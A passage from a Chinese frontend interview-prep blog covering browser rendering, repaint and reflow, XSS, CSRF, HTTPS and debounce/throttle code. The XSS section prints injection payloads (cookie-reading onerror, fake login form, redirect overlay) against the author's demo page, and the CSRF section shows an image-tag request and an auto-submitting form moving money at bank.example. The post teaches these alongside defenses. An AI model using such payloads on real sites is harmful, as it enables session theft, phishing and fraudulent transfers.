href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Positioning/Understanding_z_index/The_stacking_context">MDN层叠上下文</a></p></li><li><p>需要被裁剪的地方。比如一个div很小，但是里面有许多文字，那么超出的文字就会被裁剪。不光如此，如果出现了滚动条，滚动条也会被单独提升为一个图层。</p></li></ul><p>第二种情况是<strong>隐式合成</strong></p><p>如果一个层叠等级低的节点被提升为单独的图层之后，那么所有层叠等级高比它高的节点都会成为一个单独的图层。</p><blockquote><p>隐式合成隐藏着巨大的风险，特别是在大型应用当中，一个z-index较低的元素被提升为单独节点之后，可能会增加上千个图层，大大加大内存的压力，让页面崩溃，这就是层爆炸的原理。</p></blockquote><p><strong>生成绘制列表</strong></p><p>即根据图层树，生成绘制指令，得到一个绘制列表。</p><p><strong>生成图块和生成位图</strong></p><p>当绘制列表生成完毕之后，主线程会向<strong>合成线程</strong>发送commit信息，并它绘制列表传递给它。</p><p>由于视窗的大小相对固定，而页面有时候可能很大，如果一口气全部绘制，将相当浪费性能。所以为了节约性能，合成现成首先会对图层进行分块。</p><p>合成线程会把视窗附近的图块交给<strong>栅格化线程池</strong>，让它把图块转化为位图，实际上这个转化的过程会使用GPU进行加速，最后位图的结果会发送给合成线程。</p><p><strong>显示器显示内容</strong></p><p>栅格化操作后【即生成了位图】，合成线程会发送一个绘制指令，发送给浏览器线程，浏览器线程会绘制到内存种，然后交给显卡，从而最后显示到显示器上。</p><p><img src="https://upload-images.jianshu.io/upload_images/21987367-0f99a2eacc1d510e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/736/format/webp" alt="渲染流程" /></p><h2 id="6-谈谈你对重绘和回流的理解"><a class="markdownIt-Anchor" href="#6-谈谈你对重绘和回流的理解"></a> 6. 谈谈你对重绘和回流的理解</h2><p>以下内容我们将基于前两个问题。</p><p>我们在得到HTTTP响应后，页面的呈现经过了以下的步骤。</p><p>构建DOM树 -&gt; 计算样式 -&gt; 生成布局树 -&gt; 生成图层树-&gt; 构建绘制列表 -&gt; 生成图块和位图 -&gt; 显示器显示</p><p>首先先讲讲<strong>重绘</strong>。</p><p>重绘的触发条件是 DOM的样式修改了，但是几何属性没有改变。这意味着我们可以不用重新构建DOM树，也不用重新生成布局树和图层树，因为几何属性没有变。</p><p>所以重绘只需要 计算样式 -&gt; 构建绘制列表 -&gt; …</p><p>再讲讲<strong>回流</strong>。</p><p>回流又叫做重排。它的触发条件是DOM的几何属性发生了变化。</p><p>具体一点的话，以下操作会触发回流。</p><ul><li><p>DOM元素css样式中的几何属性发生变化，比如width，top，border等。</p></li><li><p>DOM节点发生了增减或者移动</p></li><li><p>读写offset，scroll，client族属性的时候，浏览器为了获得这些值，需要进行回流的操作。</p></li><li><p>调用window.getComputedStyle方法</p></li></ul><p>由于回流被触发的时候，DOM树、布局树、图层树都可能发生了改变，所以我们必须把 解析 和 渲染的过程全部重新执行一遍。</p><p>除了重绘和回流，实际上还有一种情况，就是直接<strong>合成</strong>。</p><p>相当于我们将直接跳到 合成线程那里，相比重绘，我们不用计算样式，不用重新构建绘制列表，而直接与合成线程交流实现合成的效果，这实际上就是<strong>GPU加速</strong></p><p>直接交给合成线程有两大好处。</p><ol><li><p>充分发挥GPU的优势，由于合成线程会调用栅格化线程池，并使用GPU来加速生成位图，而GPU是擅长处理位图数据的。</p></li><li><p>没有占用主线程的资源，因为合成线程属于非主线程，所以就算主线程卡住了，效果依然能够展示。</p></li></ol><p>在了解了 重绘、回流和直接合成之后，我们需要记住以下的最佳实践。</p><ul><li><p>避免频繁使用style，才是采用修改class的方式</p></li><li><p>采用createDocumentFragment来批量进行DOM操作</p></li><li><p>对于resize、scroll等进行防抖/节流操作</p></li></ul><h2 id="7-能不能说一说xss攻击"><a class="markdownIt-Anchor" href="#7-能不能说一说xss攻击"></a> 7. 能不能说一说XSS攻击？</h2><p>XSS的全称是<code>Cross Site Scripting</code>。为了和CSS区分故称为XSS。</p><p>XSS攻击是指在浏览器中执行恶意脚本（无论是跨域还是同域），从而拿到用户的信息。</p><p>XSS一般可以可以完成以下事情。</p><blockquote><p>我写了一个页面来遭受XSS攻击的页面。</p><p>在线预览：<a href="https://wuuconix.github.io/static/xss/">https://wuuconix.github.io/static/xss/</a></p><p>源码链接：<a href="https://github.com/wuuconix/static/tree/main/xss/src">https://github.com/wuuconix/static/tree/main/xss/src</a></p></blockquote><ol><li><p>窃取Cookie</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>wuuconix.github.io<span class="hljs-regexp">/static/</span>xss/?q=&lt;img src=x onerror=<span class="hljs-string">&quot;alert(document.cookie)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cimg%20src=x%20onerror=%22alert(document.cookie)%22%3E">窃取Cookie链接</a></p></li><li><p>修改DOM伪造登录表单</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://localhost:8080/?q=<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline-block; width: 70px&quot;</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline-block; width: 150px&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline-block; width: 70px&quot;</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline-block; width: 150px&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: block; margin-left: 50%; transform: translateX(-50%); margin-top: 10px&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;你的用户名和密码已被黑客获得&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%3E%3Cform%3E%3Clabel%20for=%22user%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E7%94%A8%E6%88%B7%E5%90%8D%3C/label%3E%3Cinput%20id=%22user%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Clabel%20for=%22pass%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E5%AF%86%E7%A0%81%3C/label%3E%3Cinput%20id=%22pass%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20style=%22display:%20block;%20margin-left:%2050%25;%20transform:%20translateX(-50%25);%20margin-top:%2010px%22%20onclick=%22alert(%27%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%B7%B2%E8%A2%AB%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%BE%97%27)%22%3E%3C/form%3E%3C/div%3E">修改DOM伪造登录表单链接</a></p></li><li><p>在页面中生成浮窗广告</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://wuuconix.github.io/static/xss/?q=<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; text-align: center;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.location.replace(&#x27;https://wuuconix.link&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 50vw&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://sina.wuuconix.link/large/007kZ47kgy1gqizz0ipr0g30f008f7wj.gif&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: block; width: 100%; font-size: 32px; text-align: center; position: absolute; top: 50%; transform: translateY(-50%); color: white; user-select: none&quot;</span>&gt;</span>点击查看更多美女<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%20style=%22position:%20relative;%20text-align:%20center;%22%20onclick=%22window.location.replace(%27https://wuuconix.link%27)%22%3E%3Cimg%20style=%22width:%2050vw%22%20src=%22https://sina.wuuconix.link/large/007kZ47kgy1gqizz0ipr0g30f008f7wj.gif%22%20%3E%3Cspan%20style=%22display:%20block;%20width:%20100%25;%20font-size:%2032px;%20text-align:%20center;%20position:%20absolute;%20top:%2050%25;%20transform:%20translateY(-50%25);%20color:%20white;%20user-select:%20none%22%3E%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E6%9B%B4%E5%A4%9A%E7%BE%8E%E5%A5%B3%3C/span%3E%3C/div%3E">在页面中生成浮窗广告链接</a></p></li></ol><p>实际上XSS的作用就是在当前页面中执行了一段恶意JS代码，考虑到JS几乎啥都能干，该页面的DOM树可能被任意修改，网页外观大变样，充斥着各种广告，不光如此，XSS完全能够利用js监控你页面上的账号密码，让你没有任何隐私而言，得到cookie更是小菜一碟。XSS能造成的危害真的可能非常大，而不光是我们平常了解的一个alert。</p><p>XSS大致可以分为反射型和存储型。</p><p>反射型XSS是将恶意脚本作为了网络请求的一部分，就像刚才三个链接一样，恶意脚本是<code>query</code>的值，我写的那个页面实际上就是把用户输入的q变成了一个div的<code>innerHTML</code>，从而让DOM结构发生改变，实现XSS注入。</p><p>反射型XSS较为明显，因为它的恶意代码在url中，如果有一点网络知识的人就能轻松看出来。</p><p>存储型则更为恐怖，直接把恶意脚本存储在了服务器上，用户看上去完全正常的网络请求仍然会执行恶意代码。</p><p><strong>XSS的防范措施</strong></p><ol><li><p>千万不能相信用户的输入，无论在前端和后端，都需要对用户的输入进行转码或者过滤。</p><p>前端可以通过一个巧妙的方法实现转码。我们都知道HTML中引号，小于号这些都是有它们特定的作用的，如果我们想在文本中没有副作用地使用这些特殊字符，可以把它们为HTML实体字符，比如双引号就是<code>&amp;quot;</code>，小于号就是<code>&amp;lt;</code>。</p><p>所以我们在防范XSS的时候可以把用户输入的各种特殊字符转化为HTML实体字符，最后页面渲染出来的还是正常的字符，但是它们已经失去了HTML中特定的功能。</p><p>而且在前端有个方便的方法用来实现这种特殊字符的转码，即利用<code>innerText</code>和<code>innerHTML</code>。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">htmlspecialchars</span> = (<span class="hljs-params">str</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>)<br>    div.<span class="hljs-property">innerText</span> = str <span class="hljs-comment">//设置innerText后再读取innerHTML，结果会把引号，尖括号等元素变成html实体</span><br>    str = div.<span class="hljs-property">innerHTML</span><br>    div = <span class="hljs-literal">null</span> <span class="hljs-comment">//希望能触发垃圾回收机制</span><br>    <span class="hljs-keyword">return</span> str<br>&#125;<br></code></pre></td></tr></table></figure><p>试试在刚才的三种模拟攻击的url加上<code>encode=1</code>。</p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cimg%20src=x%20onerror=%22alert(document.cookie)%22%3E&amp;encode=1">窃取Cookie链接 - encode</a></p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%3E%3Cform%3E%3Clabel%20for=%22user%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E7%94%A8%E6%88%B7%E5%90%8D%3C/label%3E%3Cinput%20id=%22user%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Clabel%20for=%22pass%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E5%AF%86%E7%A0%81%3C/label%3E%3Cinput%20id=%22pass%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20style=%22display:%20block;%20margin-left:%2050%25;%20transform:%20translateX(-50%25);%20margin-top:%2010px%22%20onclick=%22alert(%27%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%B7%B2%E8%A2%AB%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%BE%97%27)%22%3E%3C/form%3E%3C/div%3E&amp;encode=1">修改DOM伪造登录表单链接 - encode</a></p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%20style=%22position:%20relative;%20text-align:%20center;%22%20onclick=%22window.location.replace(%27https://wuuconix.link%27)%22%3E%3Cimg%20style=%22width:%2050vw%22%20src=%22https://sina.wuuconix.link/large/007kZ47kgy1gqizz0ipr0g30f008f7wj.gif%22%20%3E%3Cspan%20style=%22display:%20block;%20width:%20100%25;%20font-size:%2032px;%20text-align:%20center;%20position:%20absolute;%20top:%2050%25;%20transform:%20translateY(-50%25);%20color:%20white;%20user-select:%20none%22%3E%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E6%9B%B4%E5%A4%9A%E7%BE%8E%E5%A5%B3%3C/span%3E%3C/div%3E&amp;encode=1">在页面中生成浮窗广告链接 - encode</a></p></li><li><p>利用CSP <code>Content-Sucurity-Policy</code>，它是浏览器中的内容安全策略。我们可以用CSP来设置浏览器可以加载那些资源。</p><p>开启CSP可以让服务器的响应的头部中加入<code>Content-Security-Policy</code>字段。</p><p>当然还有更方便的方法，我们可以在前端页面的<code>&lt;meta&gt;</code>标签中开启它。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该配置会让浏览器只获取此域名下的文件。正常的外链图片都会完全失效，因为违反了安全策略。</p><p>尝试在之前的三种攻击中加上<code>csp=1</code>吧。</p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cimg%20src=x%20onerror=%22alert(document.cookie)%22%3E&amp;csp=1">窃取Cookie链接 - csp</a></p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%3E%3Cform%3E%3Clabel%20for=%22user%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E7%94%A8%E6%88%B7%E5%90%8D%3C/label%3E%3Cinput%20id=%22user%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Clabel%20for=%22pass%22%20style=%22display:%20inline-block;%20width:%2070px%22%3E%E5%AF%86%E7%A0%81%3C/label%3E%3Cinput%20id=%22pass%22%20style=%22display:%20inline-block;%20width:%20150px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20style=%22display:%20block;%20margin-left:%2050%25;%20transform:%20translateX(-50%25);%20margin-top:%2010px%22%20onclick=%22alert(%27%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%B7%B2%E8%A2%AB%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%BE%97%27)%22%3E%3C/form%3E%3C/div%3E&amp;csp=1">修改DOM伪造登录表单链接 - csp</a></p><p><a href="https://wuuconix.github.io/static/xss/?q=%3Cdiv%20style=%22position:%20relative;%20text-align:%20center;%22%20onclick=%22window.location.replace(%27https://wuuconix.link%27)%22%3E%3Cimg%20style=%22width:%2050vw%22%20src=%22https://sina.wuuconix.link/large/007kZ47kgy1gqizz0ipr0g30f008f7wj.gif%22%20%3E%3Cspan%20style=%22display:%20block;%20width:%20100%25;%20font-size:%2032px;%20text-align:%20center;%20position:%20absolute;%20top:%2050%25;%20transform:%20translateY(-50%25);%20color:%20white;%20user-select:%20none%22%3E%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E6%9B%B4%E5%A4%9A%E7%BE%8E%E5%A5%B3%3C/span%3E%3C/div%3E&amp;csp=1">在页面中生成浮窗广告链接 - csp</a></p><p>CSP能干的事情还有很多，比如在疑似XSS攻击【即违反了我们设置的策略】发生的情况上访问某个url实现上报。</p><p>更多CSP设置参考<a href="https://www.ruanyifeng.com/blog/2016/09/csp.html">Content Security Policy 入门教程</a></p></li><li><p>设置HttpOnly</p><p>设置HttpOnly后会让JS无法获取到Cookie，避免了那些专门获取Cookie的XSS。实际上比较局限，因为ss能干的，可不仅仅是获取Coolie。</p><p>HttpOnly需要后端配置，前端无法自行实现。</p></li></ol><h2 id="8-能不能说一说csrf攻击"><a class="markdownIt-Anchor" href="#8-能不能说一说csrf攻击"></a> 8. 能不能说一说CSRF攻击？</h2><p>CSRF <code>Cross-Site Request Forgery</code> 跨站请求伪造。</p><p>CSRF和XSS有明显区别，XSS是在某个正常页面中执行恶意代码，而CSRF是在一个恶意网站里通过一些手段跨站请求正常网站，因为正常网站有cookie等持久化存储手段，用户仍然处于登录状态，所以恶意网站就可以以正常用户的名义执行一些恶意操作。</p><p>这里有一个CSRF例子。<a href="https://benpaodewoniu.github.io/2019/09/09/hacker1/">什么是CSRF？</a></p><p>它的情景是一个银行api，用户访问这个api后就可以向别人转钱，由于此api缺少验证，黑客利用CSRF把受害者的钱转到自己的账户上。</p><p>由于恶意代码是存在黑客自己的页面上，所以它相比于XSS有着无比的自由，因为黑客可以任意的编写页面。</p><p>如果黑客已经通过一些广告策略让许多用户到达了自己的页面，现在要实现用户一访问此页面就发送某个跨站请求可以如何实现呢？</p><p>Get请求我们可以这样干</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>页面一加载就会去试图请求此图片，但实际上这个图片的src就是一个跨站请求。</p><p>至于Post请求，我们可以写一个自动提交的Form表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;hacker-form&#x27;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://bank.example/withdraw&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;account&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;bob&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000000&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;for&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;bob2&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;hacker-form&#x27;</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我写了一个模拟CSRF页面。为了方便，我在页面的右下角设置了一个浮动广告，点击后就能到达黑客的恶意页面。恶意页面会发起跨站请求，你一点击应该就能看到效果了。😃</p><p>在线预览：<a href="https://wuuconix.github.io/static/csrf/">https://wuuconix.github.io/static/csrf/</a></p><p>源码链接：<a href="https://github.com/wuuconix/static/tree/main/csrf/src">https://github.com/wuuconix/static/tree/main/csrf/src</a></p><p><strong>防范CSRF的措施</strong></p><p>说实话我觉得现在CSRF的破坏性不是很大，因为现在的绝大部分接口都是非常复杂的，不是简单的一个url就能请求成功。</p><ol><li><p>利用Cookie的SameSite属性</p><p>设置SameSite为Strict。这样第三方的请求将不会带上Cookie，黑客也就无法构造出一个有用的跨站请求了，因为没有携带cookie就意味着用户处于登出状态。</p></li><li><p>验证来源站点</p><p>可以查看请求头的Origin和Referer。前者包含请求来自的域名，后者则包含具体的URL路径。</p><p>然而这两者可以被伪造，安全性略差。利用Fetch自定义请求头应该可以实现伪造。</p></li><li><p>CSRF Token</p><p>浏览器如果要发送请求必须带上这个CSRF Token，通常第三方站点无法得到CSRF Token，就会被服务器拒绝。</p></li></ol><h2 id="9-https为什么让数据传输更安全"><a class="markdownIt-Anchor" href="#9-https为什么让数据传输更安全"></a> 9. HTTPS为什么让数据传输更安全？</h2><p>HTTP是明文传输的，它在传输过程中可能会遭遇中间人攻击。</p><p>然后HTTPS便在HTTP层和TCP加了一个中间层，也叫做安全层，安全层的核心就是加解密。</p><p>HTTPS的加解密运用了对称加密和非对称加密结合数据签名认证的方式。</p><p>以下是整个流程</p><ol><li><p>浏览器向服务器发送一个client_random和加密方法列表</p></li><li><p>服务器收到后返回server_ramdom, 加密方法和数字证书</p><blockquote><p>这个数字证书中包含了公钥</p></blockquote></li><li><p>浏览器验证数字证书，如果验证通过，则继续。</p></li><li><p>浏览器生成另一个随机数pre_random，并且用公钥加密，发送给服务器</p></li><li><p>服务器利用私钥解密这个被加密后的pre_random，得到pre_number</p></li><li><p>服务器根据之前选择的加密方法，利用client_random, server_random和pre_random共同生成secret，这就是最终的密钥，服务器生成后发送给浏览器一个确认</p></li><li><p>浏览器接受到确认后，也用同样的加密方法得到secret。</p></li><li><p>之后浏览器和服务器就用同样的密钥secret进行对称加密。</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20200330090934105.png" alt="https通信全过程" /></p><h2 id="10-能不能实现事件的防抖和节流"><a class="markdownIt-Anchor" href="#10-能不能实现事件的防抖和节流"></a> 10. 能不能实现事件的防抖和节流？</h2><p>防抖和节流的本质上是对高频率执行代码的一种优化手段。</p><p>比如浏览器的resize，scroll，keypress，mousemove等事件在触发时，会不间断地调用绑定的回调函数，极大地浪费资源，降低前端性能。</p><p>节流：n秒内只执行一次，若在n秒内重复触发，只有一次生效。</p><p>防抖：n秒后再执行该事件，若在n秒内被重复触发，则重新计时。</p><p><strong>节流代码1 利用setTimeout</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">throttle</span> = (<span class="hljs-params">fn, interval</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> flag = <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span><br>        <span class="hljs-keyword">if</span> (flag) &#123;<br>            flag = <span class="hljs-literal">false</span><br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args)<br>            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                flag = <span class="hljs-literal">true</span><br>            &#125;, interval)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是，节流函数返回的是一个函数。所以我们需要这样来调用它。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> t = <span class="hljs-title function_">throttle</span>(fn, <span class="hljs-number">1000</span>)<br><span class="hljs-title function_">t</span>() <span class="hljs-comment">//被执行</span><br><span class="hljs-title function_">t</span>() <span class="hljs-comment">//不被执行</span><br><span class="hljs-title function_">t</span>() <span class="hljs-comment">//不被执行</span><br></code></pre></td></tr></table></figure><p><strong>节流代码2 直接判断时间戳</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">throttle2</span> = (<span class="hljs-params">fn, interval</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> last = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">let</span> content = <span class="hljs-variable language_">this</span><br>        <span class="hljs-keyword">let</span> now = +<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() <span class="hljs-comment">//这里的加号用来转化为整数时间戳</span><br>        <span class="hljs-keyword">if</span> (now - last &gt; interval) &#123;<br>            last = now<br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是防抖的代码。防抖的突出特点是如果重复触发，那么计时器会重置。</p><p><strong>防抖代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">debounce</span> = (<span class="hljs-params">fn, interval</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span><br>        <span class="hljs-keyword">if</span> (timer) &#123;<br>            <span class="hljs-built_in">clearTimeout</span>(timer)<br>        &#125;<br>        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            fn.<span class="hljs-title function_">apply</span>(context, args)<br>        &#125;, interval)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是，如果在防抖情况下，如果一直重复触发，那么用户很可能会一直无法得到想要的结果，所以这里提出了一个加强版防抖 或者说加强版节流，实际上就是把防抖和节流的结合起来，以解决防抖导致的一次响应也没有的问题。</p><p><strong>防抖-节流结合代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">combine</span> = (<span class="hljs-params">fn, interval</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> last = <span class="hljs-number">0</span>, timer = <span 